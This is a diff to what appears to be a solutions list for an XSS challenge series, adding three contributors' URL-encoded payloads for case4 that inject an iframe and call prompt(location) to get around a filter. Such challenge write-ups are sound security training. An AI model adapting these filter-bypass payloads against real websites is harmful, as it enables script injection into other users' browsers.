@@ -78,3 +78,14 @@
 	    window.onload = a();
 	    
 [http://server.n0tr00t.com/n0js/case4.php](http://server.n0tr00t.com/n0js/case4.php)
+	
+	#### @woto [woto3679@gmail.com]
+	- case4.php?x=d=document;D=Document.prototype;D.appendChild.call(d.body,(D.createElement.call(d,%22iframe%22))).contentWindow.prompt.call(window,location);
+	
+	#### @evi1m0 [evi1m0.bat@gmail.com]
+	- case4.php?x=document.writeln(%27%3Ciframe%3E%27);frames[0].prompt(location)
+
+	#### @Nearg1e [yourneargo@gmail.com]
+	- case4.php?x=document.writeln(%22%3Ciframe%3E%3C/iframe%3E%22);let%20f=document.querySelector(%27iframe%27);f.contentWindow.prompt(location);
+
+[http://server.n0tr00t.com/n0js/case5.php](http://server.n0tr00t.com/n0js/case5.php)
